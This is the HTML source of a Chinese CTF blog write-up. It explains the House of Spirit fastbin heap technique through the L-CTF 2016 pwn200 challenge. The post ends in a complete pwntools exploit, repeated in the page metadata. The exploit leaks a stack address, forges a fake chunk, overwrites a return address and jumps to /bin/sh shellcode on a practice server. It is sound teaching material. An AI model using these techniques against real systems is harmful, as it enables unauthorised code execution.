@@ -1,0 +1,568 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>House_of_spirit | CAI dog</title>
+<meta name="keywords" content="">
+<meta name="description" content="House_of_spirit HOS简单记录 对于*House_of_spirit（hos）*来说，该技术会涉及到许多技术细节，这里我只简单的记录一下，具体的细节可以查看CTF Wiki和安全客
+简单来说，当程序中存在如下图所示的内存时：
+这时我们就可以利用两个可控制区域将不可控区域伪造成堆块，然后释放进fastbin，随后我们再申请刚刚释放的堆块，这样就获得了不可控区域的控制权。
+也就意味着我们需要将内存构造成如下图这样：
+释放后进入fastbin，随后再申请fastbin，就可以获得这块区域的控制权。
+例题L-CTF2016 pwn200 这里我们使用L-CTF 2016中的pwn200，题目下载：BUUCTF在线评测 (buuoj.cn)
+首先先检测一下程序的基本信息和正常流程：
+可能是因为程序年代久远，所以什么保护都没有开。
+随后看看正常流程：
+第一步是循环获取48个字节。
+第二步将刚刚我们输入的内容输出，再让我们输入字符。
+第三步将刚刚输入的字符转换为int类型，随后出现菜单。
+程序的主要流程就是这些，那么这个程序有一些什么漏洞呢，这些漏洞又是怎么构成HOS攻击的呢？
+其实这个程序主要有两个漏洞：
+漏洞一： 这里函数采用的read函数，读取了48个字节，放入v2。但是read函数的问题在于，不会自动在结尾添加*\x00*。查看该函数的栈结构：
+可以看到v2下面就是rbp，那么如果我们直接输入48个字节后，程序再输出，就会将rbp给泄露出来。
+漏洞二： 这里buf的大小为0x38（56）字节，但是read时，会读取0x40个字节，这时就会产生0x8的溢出。
+我们也可以查看栈结构，看看溢出到了哪里：
+很明显，溢出到了dest上，通过代码，我们也知道dest是一个指针。
+栈结构 现在我们知道程序有这两个漏洞，那么这两个漏洞是怎么和HOS扯上关系的呢？
+我们画一个栈结构图就知道了：
+这里可以看到，如果我们想要控制vuln1_ret，就可以在buf中构造feak_chunk，然后让dest指向feak_chunk，随后free掉这个chunk，让其进入fastbin，随后再申请。（这里需要注意，这个伪造的chunk大小要包含vuln1_ret）
+这样我们修改新申请的chunk中的值，就可以修改ret了。
+同时我们泄露了main_stack中的rbp，我们就可计算出shellcode和feak_chunk的值。
+exp #!/usr/bin/python3from pwn import *context(arch = &#39;amd64&#39;, os = &#39;linux&#39;, log_level = &#39;debug&#39;)# c = process(&#34;./pwn200&#34;)p = remote(&#39;node4.buuoj.cn&#39;, 27122)# --------------------------------------------------------------------------------------------------------------# 将shellcode放入vuln1_stack，并且泄露出main函数的rbpshellcode = &#34;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&#34;payload = shellcode.ljust(44, &#39;a&#39;)payload &#43;= &#39;.">
+<meta name="author" content="shangdi4sb">
+<link rel="canonical" href="https://jellyfish-pro.github.io/ctf/house_of_spirit/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css" integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe&#43;FVUFzPh7U=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://jellyfish-pro.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jellyfish-pro.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jellyfish-pro.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jellyfish-pro.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jellyfish-pro.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="House_of_spirit" />
+<meta property="og:description" content="House_of_spirit HOS简单记录 对于*House_of_spirit（hos）*来说，该技术会涉及到许多技术细节，这里我只简单的记录一下，具体的细节可以查看CTF Wiki和安全客
+简单来说，当程序中存在如下图所示的内存时：
+这时我们就可以利用两个可控制区域将不可控区域伪造成堆块，然后释放进fastbin，随后我们再申请刚刚释放的堆块，这样就获得了不可控区域的控制权。
+也就意味着我们需要将内存构造成如下图这样：
+释放后进入fastbin，随后再申请fastbin，就可以获得这块区域的控制权。
+例题L-CTF2016 pwn200 这里我们使用L-CTF 2016中的pwn200，题目下载：BUUCTF在线评测 (buuoj.cn)
+首先先检测一下程序的基本信息和正常流程：
+可能是因为程序年代久远，所以什么保护都没有开。
+随后看看正常流程：
+第一步是循环获取48个字节。
+第二步将刚刚我们输入的内容输出，再让我们输入字符。
+第三步将刚刚输入的字符转换为int类型，随后出现菜单。
+程序的主要流程就是这些，那么这个程序有一些什么漏洞呢，这些漏洞又是怎么构成HOS攻击的呢？
+其实这个程序主要有两个漏洞：
+漏洞一： 这里函数采用的read函数，读取了48个字节，放入v2。但是read函数的问题在于，不会自动在结尾添加*\x00*。查看该函数的栈结构：
+可以看到v2下面就是rbp，那么如果我们直接输入48个字节后，程序再输出，就会将rbp给泄露出来。
+漏洞二： 这里buf的大小为0x38（56）字节，但是read时，会读取0x40个字节，这时就会产生0x8的溢出。
+我们也可以查看栈结构，看看溢出到了哪里：
+很明显，溢出到了dest上，通过代码，我们也知道dest是一个指针。
+栈结构 现在我们知道程序有这两个漏洞，那么这两个漏洞是怎么和HOS扯上关系的呢？
+我们画一个栈结构图就知道了：
+这里可以看到，如果我们想要控制vuln1_ret，就可以在buf中构造feak_chunk，然后让dest指向feak_chunk，随后free掉这个chunk，让其进入fastbin，随后再申请。（这里需要注意，这个伪造的chunk大小要包含vuln1_ret）
+这样我们修改新申请的chunk中的值，就可以修改ret了。
+同时我们泄露了main_stack中的rbp，我们就可计算出shellcode和feak_chunk的值。
+exp #!/usr/bin/python3from pwn import *context(arch = &#39;amd64&#39;, os = &#39;linux&#39;, log_level = &#39;debug&#39;)# c = process(&#34;./pwn200&#34;)p = remote(&#39;node4.buuoj.cn&#39;, 27122)# --------------------------------------------------------------------------------------------------------------# 将shellcode放入vuln1_stack，并且泄露出main函数的rbpshellcode = &#34;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&#34;payload = shellcode.ljust(44, &#39;a&#39;)payload &#43;= &#39;." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://jellyfish-pro.github.io/ctf/house_of_spirit/" /><meta property="article:section" content="ctf" />
+
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="House_of_spirit"/>
+<meta name="twitter:description" content="House_of_spirit HOS简单记录 对于*House_of_spirit（hos）*来说，该技术会涉及到许多技术细节，这里我只简单的记录一下，具体的细节可以查看CTF Wiki和安全客
+简单来说，当程序中存在如下图所示的内存时：
+这时我们就可以利用两个可控制区域将不可控区域伪造成堆块，然后释放进fastbin，随后我们再申请刚刚释放的堆块，这样就获得了不可控区域的控制权。
+也就意味着我们需要将内存构造成如下图这样：
+释放后进入fastbin，随后再申请fastbin，就可以获得这块区域的控制权。
+例题L-CTF2016 pwn200 这里我们使用L-CTF 2016中的pwn200，题目下载：BUUCTF在线评测 (buuoj.cn)
+首先先检测一下程序的基本信息和正常流程：
+可能是因为程序年代久远，所以什么保护都没有开。
+随后看看正常流程：
+第一步是循环获取48个字节。
+第二步将刚刚我们输入的内容输出，再让我们输入字符。
+第三步将刚刚输入的字符转换为int类型，随后出现菜单。
+程序的主要流程就是这些，那么这个程序有一些什么漏洞呢，这些漏洞又是怎么构成HOS攻击的呢？
+其实这个程序主要有两个漏洞：
+漏洞一： 这里函数采用的read函数，读取了48个字节，放入v2。但是read函数的问题在于，不会自动在结尾添加*\x00*。查看该函数的栈结构：
+可以看到v2下面就是rbp，那么如果我们直接输入48个字节后，程序再输出，就会将rbp给泄露出来。
+漏洞二： 这里buf的大小为0x38（56）字节，但是read时，会读取0x40个字节，这时就会产生0x8的溢出。
+我们也可以查看栈结构，看看溢出到了哪里：
+很明显，溢出到了dest上，通过代码，我们也知道dest是一个指针。
+栈结构 现在我们知道程序有这两个漏洞，那么这两个漏洞是怎么和HOS扯上关系的呢？
+我们画一个栈结构图就知道了：
+这里可以看到，如果我们想要控制vuln1_ret，就可以在buf中构造feak_chunk，然后让dest指向feak_chunk，随后free掉这个chunk，让其进入fastbin，随后再申请。（这里需要注意，这个伪造的chunk大小要包含vuln1_ret）
+这样我们修改新申请的chunk中的值，就可以修改ret了。
+同时我们泄露了main_stack中的rbp，我们就可计算出shellcode和feak_chunk的值。
+exp #!/usr/bin/python3from pwn import *context(arch = &#39;amd64&#39;, os = &#39;linux&#39;, log_level = &#39;debug&#39;)# c = process(&#34;./pwn200&#34;)p = remote(&#39;node4.buuoj.cn&#39;, 27122)# --------------------------------------------------------------------------------------------------------------# 将shellcode放入vuln1_stack，并且泄露出main函数的rbpshellcode = &#34;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&#34;payload = shellcode.ljust(44, &#39;a&#39;)payload &#43;= &#39;."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "ctf",
+      "item": "https://jellyfish-pro.github.io/ctf/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "House_of_spirit",
+      "item": "https://jellyfish-pro.github.io/ctf/house_of_spirit/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "House_of_spirit",
+  "name": "House_of_spirit",
+  "description": "House_of_spirit HOS简单记录 对于*House_of_spirit（hos）*来说，该技术会涉及到许多技术细节，这里我只简单的记录一下，具体的细节可以查看CTF Wiki和安全客\n简单来说，当程序中存在如下图所示的内存时：\n这时我们就可以利用两个可控制区域将不可控区域伪造成堆块，然后释放进fastbin，随后我们再申请刚刚释放的堆块，这样就获得了不可控区域的控制权。\n也就意味着我们需要将内存构造成如下图这样：\n释放后进入fastbin，随后再申请fastbin，就可以获得这块区域的控制权。\n例题L-CTF2016 pwn200 这里我们使用L-CTF 2016中的pwn200，题目下载：BUUCTF在线评测 (buuoj.cn)\n首先先检测一下程序的基本信息和正常流程：\n可能是因为程序年代久远，所以什么保护都没有开。\n随后看看正常流程：\n第一步是循环获取48个字节。\n第二步将刚刚我们输入的内容输出，再让我们输入字符。\n第三步将刚刚输入的字符转换为int类型，随后出现菜单。\n程序的主要流程就是这些，那么这个程序有一些什么漏洞呢，这些漏洞又是怎么构成HOS攻击的呢？\n其实这个程序主要有两个漏洞：\n漏洞一： 这里函数采用的read函数，读取了48个字节，放入v2。但是read函数的问题在于，不会自动在结尾添加*\\x00*。查看该函数的栈结构：\n可以看到v2下面就是rbp，那么如果我们直接输入48个字节后，程序再输出，就会将rbp给泄露出来。\n漏洞二： 这里buf的大小为0x38（56）字节，但是read时，会读取0x40个字节，这时就会产生0x8的溢出。\n我们也可以查看栈结构，看看溢出到了哪里：\n很明显，溢出到了dest上，通过代码，我们也知道dest是一个指针。\n栈结构 现在我们知道程序有这两个漏洞，那么这两个漏洞是怎么和HOS扯上关系的呢？\n我们画一个栈结构图就知道了：\n这里可以看到，如果我们想要控制vuln1_ret，就可以在buf中构造feak_chunk，然后让dest指向feak_chunk，随后free掉这个chunk，让其进入fastbin，随后再申请。（这里需要注意，这个伪造的chunk大小要包含vuln1_ret）\n这样我们修改新申请的chunk中的值，就可以修改ret了。\n同时我们泄露了main_stack中的rbp，我们就可计算出shellcode和feak_chunk的值。\nexp #!/usr/bin/python3\rfrom pwn import *\rcontext(arch = \u0026#39;amd64\u0026#39;, os = \u0026#39;linux\u0026#39;, log_level = \u0026#39;debug\u0026#39;)\r# c = process(\u0026#34;./pwn200\u0026#34;)\rp = remote(\u0026#39;node4.buuoj.cn\u0026#39;, 27122)\r# --------------------------------------------------------------------------------------------------------------\r# 将shellcode放入vuln1_stack，并且泄露出main函数的rbp\rshellcode = \u0026#34;\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\u0026#34;\rpayload = shellcode.ljust(44, \u0026#39;a\u0026#39;)\rpayload += \u0026#39;.",
+  "keywords": [
+    
+  ],
+  "articleBody": "House_of_spirit HOS简单记录 对于*House_of_spirit（hos）*来说，该技术会涉及到许多技术细节，这里我只简单的记录一下，具体的细节可以查看CTF Wiki和安全客\n简单来说，当程序中存在如下图所示的内存时：\n这时我们就可以利用两个可控制区域将不可控区域伪造成堆块，然后释放进fastbin，随后我们再申请刚刚释放的堆块，这样就获得了不可控区域的控制权。\n也就意味着我们需要将内存构造成如下图这样：\n释放后进入fastbin，随后再申请fastbin，就可以获得这块区域的控制权。\n例题L-CTF2016 pwn200 这里我们使用L-CTF 2016中的pwn200，题目下载：BUUCTF在线评测 (buuoj.cn)\n首先先检测一下程序的基本信息和正常流程：\n可能是因为程序年代久远，所以什么保护都没有开。\n随后看看正常流程：\n第一步是循环获取48个字节。\n第二步将刚刚我们输入的内容输出，再让我们输入字符。\n第三步将刚刚输入的字符转换为int类型，随后出现菜单。\n程序的主要流程就是这些，那么这个程序有一些什么漏洞呢，这些漏洞又是怎么构成HOS攻击的呢？\n其实这个程序主要有两个漏洞：\n漏洞一： 这里函数采用的read函数，读取了48个字节，放入v2。但是read函数的问题在于，不会自动在结尾添加*\\x00*。查看该函数的栈结构：\n可以看到v2下面就是rbp，那么如果我们直接输入48个字节后，程序再输出，就会将rbp给泄露出来。\n漏洞二： 这里buf的大小为0x38（56）字节，但是read时，会读取0x40个字节，这时就会产生0x8的溢出。\n我们也可以查看栈结构，看看溢出到了哪里：\n很明显，溢出到了dest上，通过代码，我们也知道dest是一个指针。\n栈结构 现在我们知道程序有这两个漏洞，那么这两个漏洞是怎么和HOS扯上关系的呢？\n我们画一个栈结构图就知道了：\n这里可以看到，如果我们想要控制vuln1_ret，就可以在buf中构造feak_chunk，然后让dest指向feak_chunk，随后free掉这个chunk，让其进入fastbin，随后再申请。（这里需要注意，这个伪造的chunk大小要包含vuln1_ret）\n这样我们修改新申请的chunk中的值，就可以修改ret了。\n同时我们泄露了main_stack中的rbp，我们就可计算出shellcode和feak_chunk的值。\nexp #!/usr/bin/python3\rfrom pwn import *\rcontext(arch = 'amd64', os = 'linux', log_level = 'debug')\r# c = process(\"./pwn200\")\rp = remote('node4.buuoj.cn', 27122)\r# --------------------------------------------------------------------------------------------------------------\r# 将shellcode放入vuln1_stack，并且泄露出main函数的rbp\rshellcode = \"\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\"\rpayload = shellcode.ljust(44, 'a')\rpayload += '.tmp'\rp.send(payload)\rp.recvuntil('.tmp')\rrbp_addr = p.recvuntil(', welcome', True)\rrbp_addr = u64(rbp_addr.ljust(8,b'\\x00'))\rprint('[+] rbp_addr = ' + hex(rbp_addr))\rfake_addr = rbp_addr - 0x90 #虚假chunk的地址\rshellcode_addr = rbp_addr - 0x50 #shellcode的地址\r# --------------------------------------------------------------------------------------------------------------\rp.recvuntil('give me your id ~~?')\rp.sendline('48')\r# --------------------------------------------------------------------------------------------------------------\r# 构造fake_chunk，并覆盖dest指针\rp.recvuntil('give me money~')\rpayload = p64(0) * 5 + p64(0x41) payload = payload.ljust(0x38, b'\\x00') + p64(fake_addr) p.send(payload)\r# --------------------------------------------------------------------------------------------------------------\r# 释放chunk和重新申请\rp.recvuntil('choice : ')\rp.sendline('2')\rp.recvuntil('choice : ')\rp.sendline('1')\rp.recvuntil('how long?')\rp.sendline('48')\rp.recvuntil('\\n48\\n')\r# 覆盖掉vuln2的ret\rpayload = b'a' * 0x18 + p64(shellcode_addr)\rpayload = payload.ljust(48, b'\\x00')\rp.send(payload)\r# 退出vuln2，触发ret，转跳shellcode\rp.recvuntil('choice : ')\rp.sendline('3') p.interactive() ",
+  "wordCount" : "165",
+  "inLanguage": "en",
+  "datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "shangdi4sb"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://jellyfish-pro.github.io/ctf/house_of_spirit/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "CAI dog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://jellyfish-pro.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jellyfish-pro.github.io" accesskey="h" title="CAI dog (Alt + H)">CAI dog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://jellyfish-pro.github.io/search" title="search (Alt &#43; /)" accesskey=/>
+                    <span>search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/" title="home">
+                    <span>home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/posts" title="posts">
+                    <span>posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/note" title="note">
+                    <span>note</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/ctf" title="ctf">
+                    <span>ctf</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://jellyfish-pro.github.io">Home</a>&nbsp;»&nbsp;<a href="https://jellyfish-pro.github.io/ctf/">ctf</a></div>
+    <h1 class="post-title">
+      House_of_spirit
+    </h1>
+    <div class="post-meta">1 min&nbsp;·&nbsp;shangdi4sb
+
+</div>
+  </header> <div class="toc">
+    <details  open>
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#house_of_spirit" aria-label="House_of_spirit">House_of_spirit</a><ul>
+                        
+                <li>
+                    <a href="#hos%e7%ae%80%e5%8d%95%e8%ae%b0%e5%bd%95" aria-label="HOS简单记录">HOS简单记录</a></li>
+                <li>
+                    <a href="#%e4%be%8b%e9%a2%98l-ctf2016-pwn200" aria-label="例题L-CTF2016 pwn200">例题L-CTF2016 pwn200</a><ul>
+                        
+                <li>
+                    <a href="#%e6%bc%8f%e6%b4%9e%e4%b8%80" aria-label="漏洞一：">漏洞一：</a></li>
+                <li>
+                    <a href="#%e6%bc%8f%e6%b4%9e%e4%ba%8c" aria-label="漏洞二：">漏洞二：</a></li>
+                <li>
+                    <a href="#%e6%a0%88%e7%bb%93%e6%9e%84" aria-label="栈结构">栈结构</a></li>
+                <li>
+                    <a href="#exp" aria-label="exp">exp</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="house_of_spirit">House_of_spirit<a hidden class="anchor" aria-hidden="true" href="#house_of_spirit">#</a></h2>
+<h3 id="hos简单记录">HOS简单记录<a hidden class="anchor" aria-hidden="true" href="#hos简单记录">#</a></h3>
+<p>对于*House_of_spirit（hos）*来说，该技术会涉及到许多技术细节，这里我只简单的记录一下，具体的细节可以查看<a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/fastbin-attack/#house-of-spirit">CTF Wiki</a>和<a href="https://www.anquanke.com/post/id/85357">安全客</a></p>
+<p>简单来说，当程序中存在如下图所示的内存时：</p>
+<p><img loading="lazy" src="/ctf/House_of_spirit.assets/image-20230713093328060.png" alt="image-20230713093328060"  />
+</p>
+<p>这时我们就可以利用两个可控制区域将不可控区域伪造成堆块，然后释放进<em>fastbin</em>，随后我们再申请刚刚释放的堆块，这样就获得了不可控区域的控制权。</p>
+<p>也就意味着我们需要将内存构造成如下图这样：</p>
+<p><img loading="lazy" src="/ctf/House_of_spirit.assets/image-20230713095855250.png" alt="image-20230713095855250"  />
+</p>
+<p>释放后进入<em>fastbin</em>，随后再申请<em>fastbin</em>，就可以获得这块区域的控制权。</p>
+<h3 id="例题l-ctf2016-pwn200">例题L-CTF2016 pwn200<a hidden class="anchor" aria-hidden="true" href="#例题l-ctf2016-pwn200">#</a></h3>
+<p>这里我们使用<em>L-CTF 2016</em>中的<em>pwn200</em>，题目下载：<a href="https://buuoj.cn/challenges#lctf2016_pwn200">BUUCTF在线评测 (buuoj.cn)</a></p>
+<p>首先先检测一下程序的基本信息和正常流程：</p>
+<p><img loading="lazy" src="/ctf/House_of_spirit.assets/image-20230713101825634.png" alt="image-20230713101825634"  />
+</p>
+<p>可能是因为程序年代久远，所以什么保护都没有开。</p>
+<p>随后看看正常流程：</p>
+<p><img loading="lazy" src="/ctf/House_of_spirit.assets/image-20230713101938072.png" alt="image-20230713101938072"  />
+</p>
+<p><img loading="lazy" src="/ctf/House_of_spirit.assets/image-20230713102250373.png" alt="image-20230713102250373"  />
+</p>
+<p>第一步是循环获取48个字节。</p>
+<p><img loading="lazy" src="/ctf/House_of_spirit.assets/image-20230713102605894.png" alt="image-20230713102605894"  />
+</p>
+<p><img loading="lazy" src="/ctf/House_of_spirit.assets/image-20230713102614542.png" alt="image-20230713102614542"  />
+</p>
+<p>第二步将刚刚我们输入的内容输出，再让我们输入字符。</p>
+<p><img loading="lazy" src="/ctf/House_of_spirit.assets/image-20230713103051917.png" alt="image-20230713103051917"  />
+</p>
+<p>第三步将刚刚输入的字符转换为<em>int</em>类型，随后出现菜单。</p>
+<p>程序的主要流程就是这些，那么这个程序有一些什么漏洞呢，这些漏洞又是怎么构成HOS攻击的呢？</p>
+<p>其实这个程序主要有两个漏洞：</p>
+<h4 id="漏洞一">漏洞一：<a hidden class="anchor" aria-hidden="true" href="#漏洞一">#</a></h4>
+<p><img loading="lazy" src="/ctf/House_of_spirit.assets/image-20230713103538142.png" alt="image-20230713103538142"  />
+</p>
+<p>这里函数采用的read函数，读取了48个字节，放入<em>v2</em>。但是read函数的问题在于，不会自动在结尾添加*\x00*。查看该函数的栈结构：</p>
+<p><img loading="lazy" src="/ctf/House_of_spirit.assets/image-20230713104856024.png" alt="image-20230713104856024"  />
+</p>
+<p>可以看到<em>v2</em>下面就是<em>rbp</em>，那么如果我们直接输入48个字节后，程序再输出，就会将<em>rbp</em>给泄露出来。</p>
+<h4 id="漏洞二">漏洞二：<a hidden class="anchor" aria-hidden="true" href="#漏洞二">#</a></h4>
+<p><img loading="lazy" src="/ctf/House_of_spirit.assets/image-20230713105358670.png" alt="image-20230713105358670"  />
+</p>
+<p>这里<em>buf</em>的大小为0x38（56）字节，但是<em>read</em>时，会读取0x40个字节，这时就会产生0x8的溢出。</p>
+<p>我们也可以查看栈结构，看看溢出到了哪里：</p>
+<p><img loading="lazy" src="/ctf/House_of_spirit.assets/image-20230713110406969.png" alt="image-20230713110406969"  />
+</p>
+<p>很明显，溢出到了<em>dest</em>上，通过代码，我们也知道<em>dest</em>是一个指针。</p>
+<h4 id="栈结构">栈结构<a hidden class="anchor" aria-hidden="true" href="#栈结构">#</a></h4>
+<p>现在我们知道程序有这两个漏洞，那么这两个漏洞是怎么和HOS扯上关系的呢？</p>
+<p>我们画一个栈结构图就知道了：</p>
+<p><img loading="lazy" src="/ctf/House_of_spirit.assets/image-20231031173238545.png" alt="image-20231031173238545"  />
+</p>
+<p>这里可以看到，如果我们想要控制<code>vuln1_ret</code>，就可以在buf中构造feak_chunk，然后让dest指向feak_chunk，随后free掉这个chunk，让其进入fastbin，随后再申请。（这里需要注意，这个伪造的chunk大小要包含vuln1_ret）</p>
+<p>这样我们修改新申请的chunk中的值，就可以修改ret了。</p>
+<p>同时我们泄露了main_stack中的rbp，我们就可计算出shellcode和feak_chunk的值。</p>
+<h4 id="exp">exp<a hidden class="anchor" aria-hidden="true" href="#exp">#</a></h4>
+<pre tabindex="0"><code>#!/usr/bin/python3
+from pwn import *
+
+context(arch = &#39;amd64&#39;, os = &#39;linux&#39;, log_level = &#39;debug&#39;)
+
+# c = process(&#34;./pwn200&#34;)
+p = remote(&#39;node4.buuoj.cn&#39;, 27122)
+
+
+# --------------------------------------------------------------------------------------------------------------
+# 将shellcode放入vuln1_stack，并且泄露出main函数的rbp
+
+shellcode = &#34;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&#34;
+
+payload = shellcode.ljust(44, &#39;a&#39;)
+payload += &#39;.tmp&#39;
+p.send(payload)
+p.recvuntil(&#39;.tmp&#39;)
+rbp_addr = p.recvuntil(&#39;, welcome&#39;, True)
+rbp_addr = u64(rbp_addr.ljust(8,b&#39;\x00&#39;))
+print(&#39;[+] rbp_addr = &#39; + hex(rbp_addr))
+fake_addr = rbp_addr - 0x90             #虚假chunk的地址
+shellcode_addr = rbp_addr - 0x50        #shellcode的地址
+
+# --------------------------------------------------------------------------------------------------------------
+
+p.recvuntil(&#39;give me your id ~~?&#39;)
+p.sendline(&#39;48&#39;)
+
+# --------------------------------------------------------------------------------------------------------------
+# 构造fake_chunk，并覆盖dest指针
+
+p.recvuntil(&#39;give me money~&#39;)
+payload = p64(0) * 5 + p64(0x41) 
+payload = payload.ljust(0x38, b&#39;\x00&#39;) + p64(fake_addr) 
+p.send(payload)
+
+# --------------------------------------------------------------------------------------------------------------
+
+# 释放chunk和重新申请
+p.recvuntil(&#39;choice : &#39;)
+p.sendline(&#39;2&#39;)
+p.recvuntil(&#39;choice : &#39;)
+p.sendline(&#39;1&#39;)
+p.recvuntil(&#39;how long?&#39;)
+p.sendline(&#39;48&#39;)
+p.recvuntil(&#39;\n48\n&#39;)
+
+# 覆盖掉vuln2的ret
+payload = b&#39;a&#39; * 0x18 + p64(shellcode_addr)
+payload = payload.ljust(48, b&#39;\x00&#39;)
+p.send(payload)
+
+# 退出vuln2，触发ret，转跳shellcode
+p.recvuntil(&#39;choice : &#39;)
+p.sendline(&#39;3&#39;) 
+
+p.interactive()
+</code></pre><p><img loading="lazy" src="/ctf/House_of_spirit.assets/image-20231101092806910.png" alt="image-20231101092806910"  />
+</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://jellyfish-pro.github.io/ctf/format4_old/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>format4_old</span>
+  </a>
+  <a class="next" href="https://jellyfish-pro.github.io/ctf/ret2csuinit_new/">
+    <span class="title">Next »</span>
+    <br>
+    <span>ret2csuinit_new</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
